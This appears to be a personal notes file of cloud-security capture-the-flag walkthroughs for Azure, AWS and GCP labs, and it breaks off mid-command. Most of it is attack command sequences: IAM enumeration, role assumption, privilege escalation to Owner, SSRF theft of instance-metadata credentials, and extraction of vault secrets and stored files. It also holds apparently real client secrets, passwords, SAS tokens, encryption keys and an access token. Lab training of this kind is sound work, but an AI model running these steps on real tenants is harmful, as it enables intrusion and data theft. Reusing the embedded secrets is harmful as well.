# Offensive
## Uncovering the App Registration
Domain_Name: `secure-corp.org`

1. Discover the Tenant ID
```
https://www.whatismytenantid.com/

https://login.microsoftonline.com/secure-corp.org/.well-known/openid-configuration
```
2. Authenticate to Azure
```sh
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "client_id=caaa28c5-b8da-4d29-b42e-<redacted>" -d "scope=https://graph.microsoft.com/.default" -d "client_secret=bXj8Q~_v1Y.<redacted>" -d "grant_type=client_credentials" "https://login.microsoftonline.com/f2a33211-e46a-4c92-b84d-<redacted>/oauth2/v2.0/token"

{"token_type":"Bearer","expires_in":3599,"ext_expires_in":3599,"access_token":"eyJ0eXAiOiJKV1QiLCJub25jZSI6ImJ3cXdQUW1lNE80Z0x6ZVRTSVZmNlZjT1BoNEtoNXBRaHpwOVhILTJ0U3ciLCJhbGciOiJSUzI1NiIsIng1dCI6InJ0c0ZULWItN0x1WTdEVlllU05LY0lKN1ZuYyIsImtpZCI6InJ0c0ZULWItN0x1WTdEVlllU05LY0lKN1ZuYyJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20iLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC9mMmEzMzIxMS1lNDZhLTRjOTItYjg0ZC1hZmYwNmMyY2QxM2YvIiwiaWF0IjoxNzY0MjQ2OTI0LCJuYmYiOjE3NjQyNDY5MjQsImV4cCI6MTc2NDI1MDgyNCwiYWlvIjoiazJKZ1lGQ3RYL1UzbmExZ2tkM09tNG9aZlBwNkFBPT0iLCJhcHBfZGlzcGxheW5hbWUiOiJkZXYtYXBwIiwiYXBwaWQiOiJjYWFhMjhjNS1iOGRhLTRkMjktYjQyZS05NWIxYWJhNmI4MWMiLCJhcHBpZGFjciI6IjEiLCJpZHAiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC9mMmEzMzIxMS1lNDZhLTRjOTItYjg0ZC1hZmYwNmMyY2QxM2YvIiwiaWR0eXAiOiJhcHAiLCJvaWQiOiJkNmJjNThlZC0xMWY2LTQ3Y2QtYTE2OC1lNGQ2MDZjNWIyMmEiLCJyaCI6IjEuQWI0QUVUS2o4bXJra2t5NFRhX3diQ3pSUHdNQUFBQUFBQUFBd0FBQUFBQUFBQUFqQVFDLUFBLiIsInJvbGVzIjpbIkFwcGxpY2F0aW9uLlJlYWQuQWxsIl0sInN1YiI6ImQ2YmM1OGVkLTExZjYtNDdjZC1hMTY4LWU0ZDYwNmM1YjIyYSIsInRlbmFudF9yZWdpb25fc2NvcGUiOiJBUyIsInRpZCI6ImYyYTMzMjExLWU0NmEtNGM5Mi1iODRkLWFmZjA2YzJjZDEzZiIsInV0aSI6IjIyT3p4UXdTTmtTSVFCY3dvTmJhQUEiLCJ2ZXIiOiIxLjAiLCJ3aWRzIjpbIjA5OTdhMWQwLTBkMWQtNGFjYi1iNDA4LWQ1Y2E3MzEyMWU5MCJdLCJ4bXNfYWNkIjoxNzI2NTc3Nzk4LCJ4bXNfYWN0X2ZjdCI6IjMgOSIsInhtc19mdGQiOiJSQUx0NS1JbHJpWE9ZQ2piS0JDTUg2SWQ5bXpDLWNpaWdEYWszUEFwdndJQmEyOXlaV0Z6YjNWMGFDMWtjMjF6IiwieG1zX2lkcmVsIjoiMTIgNyIsInhtc19yZCI6IjAuNDJMallCSmkyc2NvSk1MQkxpU1F4ckZ0WmRMOFo2N3pKNFV5RmoyYnZCQW95aWtrWUxuVy0yeHdtSUxuN09VVGd3M1R0eFVCUlRtRUJKZ1pJT0FBbEFZQSIsInhtc19zcGN1IjoidHJ1ZSIsInhtc19zdWJfZmN0IjoiOSAzIiwieG1zX3RjZHQiOjE3MjAwNzEyNTQsInhtc190bnRfZmN0IjoiMyAxNCJ9.eOMfb10u06ZMEurrCKgDg_NJpR7ENvrKHqyh9xWoO6Ws6HkW-xnmtIkNgQdQfAta33Tt6uQ-zOU-E5MlIbfvEMPwj4ItkzdsmrFPBMj7nmRO6qTgQ0skZ_CErkDFJw87ZNOL6tCD-lAQ_kf85ALEgYfKSX5ynLWpUYGU5ORuaX7zQc5Uw5uNE1jwz66MlEp-ZFYP7hD_0XHDrIwVu4scWRIBqipnTz80RlDUkirqmvwTd908Y9FFjiXlJ33RX4WJDO00AjrCi_-YCbpLTA4UGzw_uE9CGaJLqDK255Z5U6hMbrciIpzGIQQHfGsRJe6vFbephejtu8FD9ppZF0gIyw"}
```
3. Connect to Microsoft Graph API
Установка модуля Microsoft Graph
```powershell
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
Install-Module Microsoft.Graph -Scope CurrentUser -Repository PSGallery -Force
```

Authentication Azure through access token, that we received in the previous step
```powershell
$token ='Access_Token'
$secureClientToken = ConvertTo-SecureString $token -AsPlainText -Force
```

```powershell
Connect-MgGraph -AccessToken $secureClientToken
```
4. Enumerate App Registrations
```powershell
Get-MgApplication
```
5. Investigate API Permissions
```powershell
#To get the details of the App Registration
$app= Get-MgApplication -ApplicationId e0c87d9c-5d45-43ea-ba30-7bb1b3a8019c

#To get the details about the permission for an application
$app.RequiredResourceAccess | ConvertTo-Json
```
6. Find the Exact API Role
```powershell
#To get the API Permissions of App Registration
$res = Get-MgServicePrincipal -Filter "DisplayName eq 'Microsoft Graph'"
$res.AppRoles | Where-Object { $_.Id -eq '9a5d68dd-52b0-4cc2-bd40-abcf44ac3a30' } | ConvertTo-Json
```

---
## Who Am IAM?
1. Configure AWS CLI with Given Credentials
```sh
aws configure
aws sts get-caller-identity
```
2. Enumerate IAM Groups
```
aws iam list-groups
```
3. Enumerate IAM Users
```
aws iam list-users
```
4. Enumerate IAM Roles
```
aws iam list-roles

#For specific role (inline)
aws iam list-role-policies --role-name <rolename>

#For the current user
aws iam list-attached-role-policies --role-name <rolename>
```
5. Retrieve Role Details
```
#For specific role
aws iam get-role --role-name <rolename>

#For the specific role and policy (inline)
aws iam get-role-policy --role-name <rolename> --policy-name <policy_name>
```
6. Enumerate IAM Policies
```
aws iam list-policies

#For the specific user (inline)
aws iam list-user-policies --user-name <username>

#For the current user
aws iam list-attached-user-policies --user-name <username>
```
7. Enumerate Group Policies
```
# For the specific Group
aws iam list-attached-group-policies --group-name <GroupName>

# For the specific Group (inline)
aws iam list-group-policies --group-name <GroupName>
```
8. Retrieve Policy Details
```
# For the specific policy
aws iam get-policy --policy-arn <policy_arn>

# For the specific user with th specific policy (inline)
aws iam get-user-policy --user-name <username> --policy-name <policy_name>
```
### Automated Tool - Pacu (AWS Exploitation Framework)
```
pip3 install -U pip
pip3 install -U pacu
pacu

#To set credentials
set key YOUR_AWS_KEY
#To Lists all available Pacu modules.
list
#To select a specific module to use.
use
#To execute the command.
Run 

#To enumerate all users, roles, policies, and groups in the AWS account.
use iam__enum_users_roles_policies_groups

#To check the permissions of the currently authenticated user or role
use iam__enum_permissions

#To analyze the IAM environment and return a report highlighting any privilege escalation opportunities that exist for the current session.
run iam__privsec_scan
```
### Automated Tool - enumerate-iam (IAM Permissions Analyzer)
```
git clone https://github.com/andresriancho/enumerate-iam.git
cd enumerate-iam
pip install -r requirements.txt

#Discovered a set of AWS credentials but unsure of their permissions?
python enumerate-iam.py --access-key <AKIA....> --secret-key <15H72mm...>
```

---
## Trust Me, Relationship is Malicious
1. Configure AWS CLI with Given Credentials
```
aws configure --profile IAM01
aws sts get-caller-identity --profile IAM01
```
2. Hunt for Misconfigured IAM Roles
**Method 1: Using a Recon Tool**
```sh
python assume_role_enum.py --account-id 058264439561 --profile IAM01
```
**Method 2: Using AWS CLI**
```sh
aws sts assume-role --role-arn arn:aws:iam::058264439561:role/DBAdmin --role-session-name Role-Session --profile IAM01
```
3. Configure Temporary Credentials
```sh
aws configure set aws_access_key_id [key-id] --profile Role
aws configure set aws_secret_access_key [key-id] --profile Role
aws configure set aws_session_token [token] --profile Role

aws sts get-caller-identity --profile Role
```
4. Enumerate Permissions & Locate the Flag
```
#To list the permission attached to the Role
aws iam list-attached-role-policies --role-name Manager_Role --profile Role

#To get the permission attached to the Role
aws iam get-policy-version --policy-arn arn:aws:iam::058264439561:policy/Manager_Access_S3 --version-id v1 --profile Role

#To list the bucket objects
aws s3 ls s3://securecorpbakstoragebuk/ --recursive --profile Role

#To download the Flag.txt object which contains the flag.
aws s3api get-object --bucket securecorpbakstoragebuk --key docs/Flag.txt flag.txt --profile Role

```

---
## IAM Access Compass (gcloud)
1. authenticate with the given credentials
```sh
gcloud auth activate-service-account --key-file testing-srvacc-key.json
```
2. Getting Project Details
```
gcloud projects list
```
3. Getting Service Accounts
```
#To list the Service Accounts for specific project
gcloud iam service-accounts list --project=woven-acolyte-428406-v9
```
4. Mapping the IAM Landscape
```
#To list the policy binding (Custom roles)
gcloud projects get-iam-policy woven-acolyte-428406-v9

#For Service Account to Service Account Permission
gcloud iam service-accounts get-iam-policy devops-service-account@woven-acolyte-428406-v9.iam.gserviceaccount.com

#For specific Service Account
gcloud projects get-iam-policy woven-acolyte-428406-v9 --flatten="bindings[].members" --filter="bindings.members:serviceAccount:testing-service-account@woven-acolyte-428406-v9.iam.gserviceaccount.com" --format="table(bindings.role)"

#To list all the roles
gcloud iam roles list --project=woven-acolyte-428406-v9
```
5. Uncovering Hidden Secrets
```
#To get the bucket policy
gcloud storage buckets get-iam-policy gs://secret-bucket-woven-acolyte-428406-v9

#To list all objects in the bucket, including those in subdirectories (recursively)
gsutil ls -r gs://secret-bucket-woven-acolyte-428406-v9

#To download the file
gsutil cp gs://secret-bucket-woven-acolyte-428406-v9/secret.txt .
```
6. Automated Tool - GCP Privilege Escalation Scanner
```sh
git clone https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation.git
cd .\GCP-IAM-Privilege-Escalation\
cd .\PrivEscScanner\

pip3 install google-auth google-auth-oauthlib google-auth-httplib2 google-api-python-client

gcloud auth print-access-token
python3 enumerate_member_permissions.py --project-id woven-acolyte-428406-v9 #paste token

python3 check_for_privesc.py
```

---
## Enumerating Cognito
1. First let’s visit the provided URL & click on the Job Portal Login button.
2. After the redirection to the Cognito URL, copy the Client ID and open AWS CLI
3. In the AWS CLI run the following command to register a new user
```sh
aws cognito-idp sign-up \
  --region ap-south-1 \
  --client-id 6h6b6gvm11k0eis3l4vhkhgi67 \
  --username testtt \
  --password testasdfaADSfa34 \
  --user-attributes '[{"Name":"email","Value":"a@s31frc3.ru"}]'
```
4. Check the email address and the TO ADDRESS is the flag.

---
## simulate-principal-policy Mirage
1. Configure AWS CLI with Given Credentials
```
aws configure
aws sts get-caller-identity 
```
2. Create a Permission List
```
ec2:StartInstances
s3:ListBucket
iam:CreateUser
```
3. Enumerate IAM Permissions
```sh
#!/bin/bash

PRINCIPAL_ARN="arn:aws:iam::058264439561:user/DevAppUser"

while read -r permission; do
    [[ -z "$permission" ]] && continue

    echo "Permission: $permission"
    
    aws iam simulate-principal-policy \
        --policy-source-arn "$PRINCIPAL_ARN" \
        --action-names "$permission" \

    echo -e "\n"
done < policy.txt
```

---

## Vaulted Keys and Hidden Blobs
1. Discover the Tenant ID
```
https://login.microsoftonline.com/secure-corp.org/.well-known/openid-configuration

f2a33211-e46a-4c92-b84d-aff06c2cd13f
```
2. Authenticate with Azure
```sh
az login --service-principal -u 76e1a895-1f05-4165-83ab-<redacted> -p 6LU8Q~<redacted> --tenant f2a33211-e46a-4c92-b84d-aff06c2cd13f
```
3. Enumerate Role Assignments
```sh
az role assignment list --assignee 76e1a895-1f05-4165-83ab-98eed07bed86 --output json --all
```
4. Locate the Key Vault & Retrieve Secrets
```sh
#To list the KeyVault in your Subscription
az keyvault list --resource-group DataBack-RG

#To list the KeyVault in your Resource Group
az keyvault list --subscription 662a4fee-a3ba-49b3-9caf-8c20ed04503f

#Once we get the KeyVault name, try to get the secrets:
az keyvault secret list --vault-name secopprobackkv
az keyvault secret show --name secopprobacksaSAASToken --vault-name secopprobackkv
```
5. Retrieve Storage details
```sh
az storage container list --account-name secopprobacksa --sas-token "sv=2024-11-04&ss=bfqt&srt=sco&sp=rltfx&se=2028-11-28T14:15:47Z&st=2025-11-28T06:00:47Z&spr=https&sig=0t6AaxsrIAHeqdwok%2FFq4xtviXOHLrwQfvdMWTG2zKE%3D" --output table

#This command will help you to list all the containers within that storage account.
az storage blob list --account-name secopprobacksa --container-name secopprobacksc --sas-token "sv=2024-11-04&ss=bfqt&srt=sco&sp=rltfx&se=2028-11-28T14:15:47Z&st=2025-11-28T06:00:47Z&spr=https&sig=0t6AaxsrIAHeqdwok%2FFq4xtviXOHLrwQfvdMWTG2zKE%3D" --output table

az storage blob download --account-name secopprobacksa --container-name secopprobacksc --name Flag.txt --file Flag.txt --sas-token "sv=2024-11-04&ss=bfqt&srt=sco&sp=rltfx&se=2028-11-28T14:15:47Z&st=2025-11-28T06:00:47Z&spr=https&sig=0t6AaxsrIAHeqdwok%2FFq4xtviXOHLrwQfvdMWTG2zKE%3D" --output table
```
## Service Account Impersonation Odyssey
1. Authenticate to GCP
```sh
gcloud auth activate-service-account --key-file GCPChallengeCredentials.json

Activated service account credentials for: [hd-service-account@woven-acolyte-428406-v9.iam.gserviceaccount.com]
```
2. List Projects
```sh
gcloud projects list

PROJECT_ID               NAME  PROJECT_NUMBER  ENVIRONMENT
woven-acolyte-428406-v9  Prod  129668539536
```
3. Identify Permissions of Your Service Account
```sh
gcloud projects get-iam-policy woven-acolyte-428406-v9 --flatten="bindings[].members" --filter="bindings.members:serviceAccount:hd-service-account@woven-acolyte-428406-v9.iam.gserviceaccount.com" --format='table(bindings.role)'

ROLE
roles/iam.serviceAccountViewer
roles/viewer
```
4. Enumerate Other Service Accounts
```sh
gcloud iam service-accounts list --project woven-acolyte-428406-v9
```
5. Check Permissions for Another Service Account
```sh
gcloud iam service-accounts get-iam-policy func-service-account@woven-acolyte-428406-v9.iam.gserviceaccount.com --project woven-acolyte-428406-v9
```
6. Investigate Cloud Functions
```sh
gcloud functions list --project woven-acolyte-428406-v9
```
7. Investigate Cloud Function IAM Policies
```sh
# To get the policy attached to the function
gcloud functions get-iam-policy secops-function --project woven-acolyte-428406-v9

# To get the details of role
gcloud iam roles describe customEditorNoDelete --project woven-acolyte-428406-v9
```
8. Exploit Service Account Impersonation
**Approach-1: Using Impersonation**
```sh
gcloud functions call secops-function --project woven-acolyte-428406-v9 --impersonate-service-account func-service-account@woven-acolyte-428406-v9.iam.gserviceaccount.com
```
**Approach-2: Using access token**
```sh
gcloud auth print-access-token --impersonate-service-account=func-service-account@woven-acolyte-428406-v9.iam.gserviceaccount.com

gcloud functions call secops-function --project woven-acolyte-428406-v9 --access-token-file token.txt
```
## EntraID Permission Atlas
1. Authenticate to Azure
```sh
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" \
-d "client_id=caaa28c5-b8da-4d29-b42e-95b1aba6b81c" \
-d "scope=https://graph.microsoft.com/.default" \
-d "client_secret=bXj8Q~_v1Y.hArjCqwQBUhCE-MwAvqB_Q1AcAa-V" \
-d "grant_type=client_credentials" \
https://login.microsoftonline.com/f2a33211-e46a-4c92-b84d-aff06c2cd13f/oauth2/v2.0/token

#or like this
az login --service-principal -u e8086d7e-9304-4597-a447-<redacted> -p RvL8Q~<redacted>~M119m~9Rp3K-aFx --tenant f2a33211-e46a-4c92-b84d-aff06c2cd13f
```
2. Enumerate Users, Groups & Applications
```sh
#To list the Users
az ad user list --query '[].{User:displayName, UPN:userPrincipalName, ObjectId:objectId}'

#List all groups:
az ad group list --query '[].{Name:displayName, ObjectId:objectId}' --output table

#To list the Applications (App Registrations)
az ad app list --query '[].{AppName:displayName, AppId:appId, ObjectId:objectId}'

#To list the Service Principals
az ad sp list --query '[].{SPName:displayName, AppId:appId, ObjectId:objectId}'
```
3. Investigate IAM Roles & Permissions
```sh
#To get the roles assigned with the users
az role assignment list --assignee 'user_principal_name' --all

#To get the role assigned with the service principls
az role assignment list --assignee <ServicePrincipalObjectId> --query '[].{Role:roleDefinitionName, Scope:scope}'

#To get the role definition
az role definition list --query '[].{RoleName:roleName, Id:id}' --output table
```
4. Identify the App Registration Owner
```sh
#To get the details about application permission
az ad app show --id <ApplicationId> --query "requiredResourceAccess"

#To get the details of App Role of Application (App Registration)
az ad app show --id 84a6fe6a-2642-4832-b0d1-f8e0c4cad633 --query "appRoles"

#To know who is the owner of App Registration
az ad app owner list --id <AppObjectId> --query '[].{OwnerName:displayName, OwnerUPN:userPrincipalName}'

#To know who is the owner of App Registration using Mggraph
Get-MgApplicationOwner -ApplicationId "84a6fe6a-2642-4832-b0d1-f8e0c4cad633" | ConvertTo-Json
```
### Automated Tool - MicroBurst
```
github.com/NetSPI/MicroBurst
```

---
## Service Principals Permission Paradox
1. Discover the Tenant ID
```url
https://login.microsoftonline.com/secure-corp.org/.well-known/openid-configuration
```
2. Authenticate & Gain Entry
```sh
az login --service-principal -u 5ee2cd9a-8ec5-4a06-a543-30ce0fc1585f -p o8g8Q~jZzIZ-eoCgxSC0CDSsdwJ9pjsTRVEIJdsT --tenant f2a33211-e46a-4c92-b84d-aff06c2cd13f
```
3. Uncover the Service Principal’s Permissions
```sh
az role assignment list --assignee 5ee2cd9a-8ec5-4a06-a543-30ce0fc1585f --output json --all
az role assignment list --output json --all

#This command will help the user to get the Role Assignment/permissions assigned to the Service Principal.
az role definition list --name "secops-testing-mgmt-sp-role" --query "[].{RoleName:roleName, Permissions:permissions}" --output json
```
**Key Finding:** If the Service Principal has **Microsoft.Authorization/roleAssignments/write**, it can assign ANY role to itself within the defined scope. This is your **privilege escalation gateway!**
4. Privilege Escalation
```sh
az role assignment create --assignee 5ee2cd9a-8ec5-4a06-a543-30ce0fc1585f --role "Owner" --scope "/subscriptions/662a4fee-a3ba-49b3-9caf-8c20ed04503f/resourceGroups/Secops-Testing-rg/providers/Microsoft.Storage/storageAccounts/secopstestingtoolsacc"
```
5. Exfiltrate the Flag!
```sh
az storage container list --account-name secopstestingtoolsacc --auth-mode login --output table

az storage blob list --account-name secopstestingtoolsacc --container-name secopstestingtoolscont --auth-mode login --output table
```

---
## EC2 Compromise (ssrf aws)
1. Exploiting SSRF to Access EC2 Metadata
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-prod-role #выдаст доступы
```
2. Authorizing IAM Security Credentials
```sh
export AWS_ACCESS_KEY_ID=<AWS_ACCESS_KEY_ID>
export AWS_SECRET_ACCESS_KEY=<AWS_SECRET_ACCESS_KEY>
export AWS_SESSION_TOKEN=<AWS_SESSION_TOKEN>
aws sts get-caller-identity
```

---
## Compute Crack (rce Azure)
```sh
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

```sh
export AZURE_ACCESS_TOKEN=$(cat token.txt)
export ARM_TENANT_ID="f2a33211-e46a-4c92-b84d-aff06c2cd13f"

az rest \
  --method get \
  --url "https://management.azure.com/subscriptions?api-version=2020-01-01" \
  --headers "Authorization=Bearer $AZURE_ACCESS_TOKEN"
```

---
## Compute Engine Intrusion (rce GCP)
```sh
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/service-accounts/
```

---
## testIamPermissions() Probe
1. Authenticate to GCP
```sh
gcloud auth activate-service-account --key-file <Keyfile>
```
2. Craft Your Permission Request
```json
{
  "permissions": [
    "resourcemanager.projects.get",
    "resourcemanager.projects.delete",
    "iam.serviceAccounts.actAs"
  ]
}
```
3. Exploitation
```sh
curl -X POST -H "Authorization: Bearer $(gcloud auth print-access-token)" -H "Content-Type: application/json; charset=utf-8" -d @request.json "https://cloudresourcemanager.googleapis.com/v1/projects/woven-acolyte-428406-v9:testIamPermissions"

{
  "permissions": [
    "iam.serviceAccounts.actAs"
  ]
}
```

---
## KeyMaster - Decoding S3 Secrets
1. Identify User Permissions
```sh
aws iam get-user
aws iam get-user --query "User.PermissionsBoundary" --output text

aws iam get-policy --policy-arn arn:aws:iam::058264439561:policy/PermissionBoundaryPolicy
aws iam get-policy-version --policy-arn arn:aws:iam::058264439561:policy/PermissionBoundaryPolicy --version-id v3
```
2. Exploiting Misconfigurations
It turns out that the user has the ability to attach inline policies! This means we can escalate privileges within the allowed scope.

Create a **policy.json** file:
```
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:*"
      ],
      "Resource": [
        "arn:aws:s3:::securecopbakupbuk1",
        "arn:aws:s3:::securecopbakupbuk1/*"
      ]
    },
    {
      "Effect": "Allow",
      "Action": "kms:*",
      "Resource": "arn:aws:kms:us-east-1:058264439561:key/a7a251b3-c889-4dd1-9176-931c207c33d5"
    }
  ]
}
```
Once we created the **policy.json**, we can assign it to the current user.
```sh
aws iam put-user-policy --user-name BackupReader1 --policy-name KMSFullAccessPolicy --policy-document file://policy.json
```
Now let’s view whether the permission is assigned or not to the user
```sh
aws iam list-attached-user-policies --user-name BackupReader1
aws iam get-policy --policy-arn arn:aws:iam::058264439561:policy/UserPolicy
aws iam get-policy-version --policy-arn arn:aws:iam::058264439561:policy/UserPolicy --version-id v1
```
4. Exploiting S3 and KMS Access
```sh
#To list the objects
aws s3 ls s3://securecopbakupbuk1/
#To get the object
aws s3 cp s3://securecopbakupbuk1/key.txt .
```
5. Using the KMS Key to Retrieve Encrypted Objects
```sh
#To download the Hospital+Patient+Records.zip
aws s3api get-object --bucket securecopbakupbuk1 --key env.txt ./env9.txt --sse-customer-algorithm AES256 --sse-customer-key ZhL8Zvaa3Xybf/sizoGwtrgKpxkxE46JJMiz1syVGQM= --sse-customer-key-md5 ESUzbd203tahLpxvA6LL4g==

#To download the env.txt
aws s3api get-object --bucket securecopbakupbuk1 --key Hospital+Patient+Records.zip ./Hospital9.zip --sse-customer-algorithm AES256 --sse-customer-key ZhL8Zvaa3Xybf/sizoGwtrgKpxkxE46JJMiz1syVGQM= --sse-customer-key-md5 ESUzbd203tahLpxvA6LL4g==
```

---
## CloudFunction Parody
1. fuzz for leak configuration.txt
2. curl to leaked url to invoke the Cloud Function
```sh
curl -X POST "https://us-central1-woven-acolyte-428406-v9.cloudfunctions.net/recovery-function?action=token" -H "Content-Type: application/json"  -d '{}'
```
4. decode token

---
## Lambda Escalation
1. Configure AWS CLI with Given Credentials
```sh
aws configure
aws sts get-caller-identity
```
2. Enumerate AWS S3 Buckets
```sh
# To list all the Buckets
aws s3 ls

# To list all the objects of the bucket
aws s3 ls s3://lambdamgmtbuk
```
3. Investigate IAM Permissions
```sh
aws iam list-attached-user-policies --user-name developer1
```
4. Analyze Policy Permissions
```sh
aws iam get-policy --policy-arn arn:aws:iam::058264439561:policy/ListUserPoliciesPolicy

aws iam get-policy --policy-arn arn:aws:iam::058264439561:policy/LambdaInvokePolicy
```
5. Retrieve Policy Details
```sh
aws iam get-policy-version --policy-arn arn:aws:iam::058264439561:policy/ListUserPoliciesPolicy --version-id v1

aws iam get-policy-version --policy-arn arn:aws:iam::058264439561:policy/LambdaInvokePolicy --version-id v1
```
6. Invoke Lambda Function
```sh
aws lambda invoke --function-name Bucket-mgmgt-Function output.json --region us-east-1
```

---
## Abusing SSM Parameter Access
1. Configuring AWS Credentials
```sh
aws configure
aws sts get-caller-identity
```
2. Recon & Enumeration 
```sh
# see what **permissions/access** authenticated user has:
aws iam list-user-policies --user-name DevLead

# extract more details by performing **get-user-policy**:
aws iam get-user-policy --user-name DevLead --policy-name user-policy
```
3. The SSM Parameter Discovery
```sh
aws ssm describe-parameters --region us-east-1

aws ssm get-parameter --name "/challenge/flag" --region us-east-1

An error occurred (AccessDeniedException) when calling the GetParameter operation: User: arn:aws:iam::058264439561:user/DevLead is not authorized to perform: ssm:GetParameter on resource: arn:aws:ssm:us-east-1:058264439561:parameter/challenge/flag because no identity-based policy allows the ssm:GetParameter action
```
4. Abusing the Lambda Function
```sh
# Retrieve metadata and configuration of the Lambda function:
aws lambda get-function --function-name key-mgmt-function --region us-east-1
```
The above command will give us all details about the “key-mgmt-function”.
With that it will also give us very important detail, it will show us where actually the code of the function is stored.
It provides a signed URL to download the Lambda ZIP code.
create input.json:
```json
{
  "action": "invoke",
  "parameter_name": "/challenge/flag"
}
```
Now invoke the Lambda function with this payload: 
```sh
aws lambda invoke --function-name key-mgmt-function --payload file://input.json --cli-binary-format raw-in-base64-out output.json --region us-east-1
```

---
## Whispers from SQS
1. configure creds `aws configure` + `aws sts get-caller-identity`
2. Investigate IAM Permissions
```sh
aws iam list-user-policies --user-name queue-inspector
```
3. Analyze Policy Permissions
```sh
aws iam get-user-policy --user-name queue-inspector --policy-name queue-inspector-user-policy
```
4. Exploring Queues
```sh
#getting a list of all queues:
aws sqs list-queues --region us-east-1

#try to get the attributes of the Queue
aws sqs get-queue-attributes --queue-url https://sqs.us-east-1.amazonaws.com/058264439561/secops-messanger-queue --attribute-names All --region us-east-1
```
5. Reading Messages
```sh
aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/058264439561/secops-messanger-queue --max-number-of-messages 10 --region us-east-1
```
---
## Assume & Decrypt (or vice versa)
1. configure creds `aws configure` + `aws sts get-caller-identity`
2. Investigate IAM Permissions
```sh
aws iam list-user-policies --user-name Operation_Manager
```
3. Analyze Policy Permissions
```sh
aws iam get-user-policy --user-name Operation_Manager --policy-name Operation_Manager_User_Policy
```
From these results, we confirm that Operation_Manager can:
- Read-only visibility into IAM users and policies (can enumerate and inspect policies but cannot change anything).
- S3 Access: Full read-only access to the proj-446792 bucket (list and download objects).
The user has read-only privileges. They cannot create, modify, or delete S3 objects, IAM resources, or any other AWS resources, but can view and download the data stored in the proj-446792 S3 bucket.
4. The S3 Object Discovery
```sh
aws s3 ls s3://proj-446792
aws s3 cp s3://proj-446792/proj-446792-config.json .
```
Although the s3:GetObject permission exists, the object is encrypted with a customer-managed AWS KMS key.
Attempt to Enumerate KMS Keys:
```sh
aws kms list-keys --region us-east-1
```
While direct KMS enumeration is blocked, the policy does grant broad read access to IAM.

**Look for Role-Assumption Opportunities:**
If we discover a role with broader permissions, especially one allowing sts:AssumeRole, we might be able to pivot.
You can use the IAM list-roles command combined with a JMESPath filter to search every role’s assume-role policy and return only those whose trust relationship lists the Operation_Manager user as a principal.
```sh
aws iam list-roles --query "Roles[?to_string(AssumeRolePolicyDocument.Statement[].Principal.AWS) != '' && contains(to_string(AssumeRolePolicyDocument.Statement[].Principal.AWS), 'arn:aws:iam::058264439561:user/Operation_Manager')].Arn" --output json
```
After identifying the customer-onboard-role as assumable by the Operation_Manager user, the next step is to examine the role’s inline policies to see what actions it allows.
```sh
aws iam list-role-policies --role-name customer-onboard-role

aws iam get-role-policy --role-name customer-onboard-role --policy-name customer-onboard-role-policy
```
5. Assume to Decrypt
```sh
aws sts assume-role --role-arn arn:aws:iam::058264439561:role/customer-onboard-role --role-session-name tempSession
```
Even though the trust policy lists the Operation_Manager user as a principal, the role cannot be assumed without an additional parameter.
```sh
aws iam get-role --role-name customer-onboard-role
```
The trust policy includes an ExternalId condition. This means AWS requires the external ID to match in order for the AssumeRole action to succeed.
```sh
aws sts assume-role --role-arn arn:aws:iam::058264439561:role/customer-onboard-role --role-session-name tempSession --external-id A7F3K2-9X0B5D-Q4M8N1-V6P7R3
```
6. Accessing the S3 Bucket
```sh
aws configure set aws_access_key_id [key-id]
aws configure set aws_secret_access_key [Secret-id]
aws configure set aws_session_token [token]

aws sts get-caller-identity

aws s3 ls s3://proj-446792
aws s3 cp s3://proj-446792/proj-446792-config.json .
```
---
## Function's Backdoor Route
1. Discover the Tenant ID and login
```sh
https://login.microsoftonline.com/secure-corp.org/.well-known/openid-configuration

f2a33211-e46a-4c92-b84d-aff06c2cd13f

az login --service-principal -u 72e81160-1944-4aa5-8a2d-e30c53dbd9b2 -p k5m8Q~tLSVXpbWVxPEX1cH44mFzKzDv6QYpinc6O --tenant f2a33211-e46a-4c92-b84d-aff06c2cd13f

az account show
```
2. Role Enumeration – Know The Permissions
```sh
az role assignment list --assignee 291c1bef-0ea8-4591-a810-67ff0fc5a44b --output json --all

#To get the permissions attached in the role:
az role definition list --name "secops-func_Role1" --query "[].{RoleName:roleName, Permissions:permissions}" --output json
```
3. Extracting the Function Key from Azure Key Vault
```sh
az keyvault list --output table

#Now let’s try to list secrets stored in this KeyVault:
az keyvault secret list --vault-name secops-func-kv --output table

#Now try to get the value of the secret:
az keyvault secret show --vault-name secops-func-kv --name secops-func-key --query value --output tsv
```
4. Triggering the Azure Function (The Backdoor Route)
```sh
#Try to list all the Function Apps
az functionapp list --resource-group secopsfunc

#So we found the function-App name and we have one function Key as well, so through this we can invoke the function.
curl "https://secops-func.azurewebsites.net/api/secops?code=vRAYaIyGzn6q52XWP_-ne9PN4bZzUghPq_b-PclNmro8AzFuK0M7VQ==&expiry=15"
```
5. Weaponizing the SAAS Token
```sh
az storage container list --account-name secopsdatastoreacc --sas-token "st=2025-06-19T09%3A52....." --output table

#Now let’s try to list blobs if present in secopsdatastoreacont
az storage blob list --account-name secopsdatastoreacc --container-name secopsdatastoreacont --sas-token "st=2025-06-19T09%3A52....." --output table

#Download file
az storage blob download --account-name secopsdatastoreacc --container-name secopsdatastoreacont --name Flag.txt --file Flag.txt --sas-token "st=2025-06-19T09%3A52....."
```
---
## APP Callback Chaos
1. login
```sh
az login --service-principal -u 76e1a895-1f05-4165-83ab-<redacted> -p 6LU8Q~<redacted> --tenant f2a33211-e46a-4c92-b84d-aff06c2cd13f

az account show

ACCESS_TOKEN=$(az account get-access-token --resource https://management.azure.com/ --query accessToken -o tsv)
```
2. Role Enumeration – Know The Permissions
```sh
az role assignment list \
    --assignee e8f4ab33-1a64-476d-9af0-f7b33eec15ae \
    --resource-group LogicAPP-Rg \
